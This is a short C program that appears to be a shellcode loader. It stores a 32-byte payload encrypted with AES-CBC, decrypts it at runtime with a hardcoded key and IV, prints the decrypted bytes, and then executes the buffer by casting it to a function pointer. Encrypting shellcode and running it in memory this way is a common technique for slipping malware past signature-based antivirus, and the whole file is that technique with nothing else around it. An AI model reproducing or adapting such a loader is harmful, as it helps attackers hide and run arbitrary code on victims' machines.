#include <stdio.h>
#include <string.h>
#include "aes.h"
#define CBC 1

unsigned char code[] = 
"\x11\xc4\xf1\x6e\x1a\x61\xae\xec\x83\x40\xe7\xaf\xfa\x43\x32\x2d\x7f\xb7\xde\xec\x16\xfd\x99\x58\x8d\xda\x72\x09\xbc\xa9\x48\x88";

int main()
{
	size_t shellcodeSize = sizeof(code);

	unsigned char key[] = "0123456789abcdef0123456789abcdef";
	unsigned char iv[] = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10";

	struct AES_ctx ctx;
	AES_init_ctx_iv(&ctx, key, iv);
	AES_CBC_decrypt_buffer(&ctx, code, shellcodeSize);

	printf("Decrypted Shellcode: \n");

	for (int i = 0; i < shellcodeSize - 1; i++) {
		printf("\\x%02x", code[i]);
	}

	printf("\n\nExecuting Shellcode...\n");

	int (*ret)() = (int(*)())code;

        ret();
}
